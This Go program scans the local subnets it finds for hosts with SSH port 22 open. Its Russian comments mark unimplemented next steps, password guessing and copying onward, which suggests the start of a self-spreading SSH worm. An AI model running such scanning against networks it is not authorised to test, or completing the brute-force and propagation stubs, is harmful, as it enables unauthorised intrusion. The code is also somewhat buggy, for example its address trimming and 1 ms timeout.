package main

import (
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"time"
)

func main() {
	// какая подсеть
	netIP := myNet()
	for _, ip := range netIP {
		log.Println("найдена подсеть ", ip)
	}

	// поиск хостов
	allHost := searchHosts(netIP)
	for _, ssh := range allHost {
		log.Println("доступны по ssh ", ssh)
	}

	// подбор пароля

	// копирование и ДАЛЬШЕ
}

// поиск подсетей
func myNet() []string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		log.Println(err)
		os.Exit(1)
	}

	result := make([]string, 0)

	for _, a := range addrs {
		if ipnet, ok := a.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				addr := net.ParseIP(ipnet.IP.String())
				mask := addr.DefaultMask()
				network := addr.Mask(mask)
				// docker network - not scan
				if !strings.Contains(network.String(), "172.17.0") {
					result = append(result, network.String())
				}
			}
		}
	}

	return result
}

// поиск хостов
func searchHosts(netIP []string) []string {
	allHosts := make([]string, 0)

	for _, host := range netIP {
		host = strings.TrimRight(host, "0")

		for i := 1; i < 254; i++ {
			conn, err := net.DialTimeout("tcp", host+strconv.Itoa(i)+":"+"22", time.Duration(1)*time.Millisecond)
			if err == nil {
				// отправка текста
				fmt.Fprintf(conn, "HELLO\r\n")
				buf := make([]byte, 0, 4096) // big buffer
				tmp := make([]byte, 256)     // using small tmo buffer for demonstrating
				for {
					n, err := conn.Read(tmp)
					if err != nil {
						if err != io.EOF {
							fmt.Println("read error:", err)
						}
						break
					}
					buf = append(buf, tmp[:n]...)
				}
				conn.Close()
				allHosts = append(allHosts, host+strconv.Itoa(i))
			} else {
				continue
			}
		}
	}
	return allHosts
}
